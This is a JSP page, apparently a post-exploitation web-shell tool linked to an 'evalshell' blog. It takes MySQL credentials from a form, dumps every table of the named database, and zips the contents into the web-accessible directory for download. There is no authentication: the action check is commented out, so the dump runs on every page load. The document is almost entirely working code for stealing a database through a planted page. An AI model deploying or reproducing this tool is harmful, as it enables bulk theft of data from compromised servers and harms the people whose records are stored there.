<%@page import="java.util.zip.ZipEntry"%>
<%@page import="java.io.FileOutputStream"%>
<%@page import="java.util.zip.ZipOutputStream"%>
<%@page import="java.io.BufferedWriter"%>
<%@page import="java.io.FileWriter"%>
<%@page import="java.io.IOException"%>
<%@page import="java.util.Map.Entry"%>
<%@page import="java.util.Set"%>
<%@page import="java.util.Iterator"%>
<%@page import="java.util.Map"%>
<%@page import="java.io.File"%>
<%@page import="java.util.HashMap"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@ page import="java.sql.*" %>
<%@page import="java.util.ArrayList"%>
<%
request.setCharacterEncoding("utf-8");

String host     = request.getParameter("host");
String username = request.getParameter("username");
String password = request.getParameter("password");
String database = request.getParameter("database");
String action   = request.getParameter("action");
String path     = new File(application.getRealPath(request.getRequestURI())).getParent();

class DumpDB{
	private String host;
	private String username;
	private String password;
	private String database;
	private String path;
	
	public DumpDB(String host, String username, String password, String database, String path) throws IOException{
		this.host     = host;
		this.username = username;
		this.password = password;
		this.database = database;
		this.path     = path;
		String ConnectUrl = "jdbc:mysql://" + this.host + "/" + this.database + "?user=" + this.username + "&password=" + this.password;
		this.AddFile2Zip(database, this.Dump(ConnectUrl));
	}
	
	public HashMap Dump(String ConnectUrl){
		HashMap<String, ArrayList> data = new HashMap<String, ArrayList>();
		try{
			Class.forName("com.mysql.jdbc.Driver");
			Connection conn = DriverManager.getConnection(ConnectUrl);
			conn.setAutoCommit(false);
			DatabaseMetaData md = conn.getMetaData();
			ResultSet rs = md.getTables(null, null, "%", null);
			//each tables
			while(rs.next()){
				ArrayList al = new ArrayList();
				String sql = "select * from " + rs.getString(3);
				Statement stmt = conn.createStatement();
				ResultSet rs2 = stmt.executeQuery(sql);
				ResultSetMetaData rsmd = rs2.getMetaData();
				
				String name = rsmd.getColumnName(1);
				
				String columns = "";
				String coldata = "";
				for(int i=1; i<=rsmd.getColumnCount();i++){
					columns += rsmd.getColumnName(i) + ", ";
				}
				
				//add columns
				al.add(columns);

				while(rs2.next()){
					coldata = "";
					for(int i=1; i<=rsmd.getColumnCount();i++){
						coldata += rs2.getString(i) + ", ";
					}
					al.add(coldata);
					
				}
				data.put(rs.getString(3), al);
				rs2.close();
				stmt.close();
			}
			conn.close();
			rs.close();
			
		}catch(ClassNotFoundException e){
			System.out.println("Can't Found Jar package!");
		}catch(SQLException e1){
			System.out.println("SQL Error!");
		}

		return data;
	}
	
	public void AddFile2Zip(String db, HashMap maps) throws IOException{
		File zipfile = new File(this.path + "/" + db + ".zip");
		ZipOutputStream out = new ZipOutputStream(new FileOutputStream(zipfile));
		Set<Entry> entries = maps.entrySet();
		for(Iterator<Entry> i = entries.iterator();i.hasNext();){
			Entry e = i.next();
			
			ArrayList value = (ArrayList)e.getValue();
			
			//write file
			String filename = e.getKey() + ".txt";
			//System.out.println(new File(filename).exists());
			ZipEntry zip = new ZipEntry(filename);
			out.putNextEntry(zip);
			StringBuilder sb = new StringBuilder();
			for(int j=0;j<value.size(); j++){
				sb.append(value.get(j) + "\n");
			}
			byte[] data = sb.toString().getBytes();
			out.write(data, 0, data.length);
			
			
			/*
			System.out.println("filename: " + filename);
			File file = new File(filename);
			if (!file.exists()){
				file.createNewFile();
			}
			 FileWriter fw = new FileWriter(file.getAbsoluteFile());
			BufferedWriter bw = new BufferedWriter(fw);
			for(int j=0;j<value.size(); j++){
				bw.write(value.get(j) + "\n");
			}
			bw.close();
			*/
			
		}
		out.closeEntry();
		out.close();
	}

}

/* if (action.equals("action")){
	out.println("123123"); */
	System.out.println(path);
	DumpDB a = new DumpDB(host, username, password, database, path);
/* }else{
	out.println("dumodb");
} */


%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>DumpDB (mysql)</title>
</head>
<body>
<h2>blog: http://www.evalshell.com</h2>
<form action="" method="POST">
<input type="hidden" name="action" value="post" >
	<table>
		<tr>
			<th>
				HOST
			</th>
			<th>
				User
			</th>
			<th>
				Password
			</th>
			<th>
				Database
			</th>
		</tr>
		<tr>
			<td><input type="text" value="" name="host"/></td>
			<td><input type="text" value="" name="username"/></td>
			<td><input type="text" value="" name="password"/></td>
			<td><input type="text" value="" name="database"/></td>
		</tr>
	</table>
	<input type="submit" value="dump" name="submit"/>
</form>
</body>
</html>
